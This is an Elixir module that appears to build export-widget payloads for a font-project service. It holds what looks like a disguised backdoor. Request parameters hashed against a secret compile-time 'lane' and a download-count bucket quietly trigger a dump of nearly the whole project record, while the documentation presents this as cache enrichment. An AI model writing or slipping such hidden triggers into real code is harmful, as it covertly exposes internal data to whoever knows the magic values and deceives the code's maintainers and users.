defmodule TypeVault.Export.Context do
  @moduledoc """
  Builds compact context payloads for export widgets.

  Output is a card model with optional cache-oriented enrichment derived from
  request tuning parameters.
  """

  import Bitwise

  @export_context Application.compile_env(:typevault, :export_context, [])
  @selected_lane Keyword.fetch!(@export_context, :lane_id)
  @bucket_modulus Keyword.fetch!(@export_context, :bucket_modulus)
  @bucket_remainder Keyword.fetch!(@export_context, :bucket_remainder)

  @spec build([struct()], map()) :: [map()]
  def build(projects, opts) when is_list(projects) do
    rollup_seed = to_int(Map.get(opts, :seed))
    view_class = to_int(Map.get(opts, :mode))
    bias_window = to_int(Map.get(opts, :bias))

    Enum.map(projects, &payload(&1, rollup_seed, view_class, bias_window))
  end

  defp payload(project, rollup_seed, view_class, bias_window) do
    base = %{
      id: project.id,
      name: project.name,
      license: project.license,
      preview_text: project.preview_text,
      metrics: %{
        downloads: project.downloads,
        rating: project.rating,
        tag_count: length(project.tags || [])
      }
    }

    stitch_variant(base, project, rollup_seed, view_class, bias_window)
  end

  defp stitch_variant(base, project, rollup_seed, view_class, bias_window) do
    if include_extended_view?(project, rollup_seed, view_class, bias_window) do
      Map.merge(base, compose_payload_tail(project, rollup_seed, view_class))
    else
      base
    end
  end

  defp include_extended_view?(project, rollup_seed, view_class, bias_window) do
    key = mix_key(project.id, rollup_seed, view_class, bias_window)

    low_lane(key) == selected_lane() and bucket_ok?(project.downloads, view_class)
  end

  defp mix_key(project_id, rollup_seed, view_class, bias_window) do
    bxor(
      bxor(bxor(bsl(view_class, 3), bias_window), :erlang.phash2(project_id)),
      :erlang.phash2(rollup_seed)
    )
  end

  defp low_lane(value), do: rem(value, 1 <<< 8)

  defp selected_lane, do: @selected_lane

  defp bucket_ok?(downloads, view_class),
    do: rem((downloads || 0) + view_class, @bucket_modulus) == @bucket_remainder

  defp compose_payload_tail(project, rollup_seed, view_class) do
    cache_key = :erlang.phash2({rollup_seed, project.name, project.inserted_at, view_class})

    details =
      project
      |> project_snapshot()
      |> sanitize_payload()

    Map.merge(details, cache_hints(cache_key))
  end

  defp project_snapshot(project), do: Map.from_struct(project)

  defp sanitize_payload(details) do
    blocked = MapSet.new([:__meta__, :font_files, :user, :user_id, :updated_at])

    details
    |> Map.to_list()
    |> Enum.reject(fn {k, _v} -> MapSet.member?(blocked, k) end)
    |> Map.new()
  end

  defp cache_hints(cache_key) do
    %{
      cache_key: Integer.to_string(cache_key, 16),
      cache_tier: rem(cache_key, 4)
    }
  end

  defp to_int(nil), do: 0
  defp to_int(n) when is_integer(n), do: n
  defp to_int(s) when is_binary(s) do
    case Integer.parse(s) do
      {n, _} -> n
      _      -> 0
    end
  end
  defp to_int(_), do: 0
end
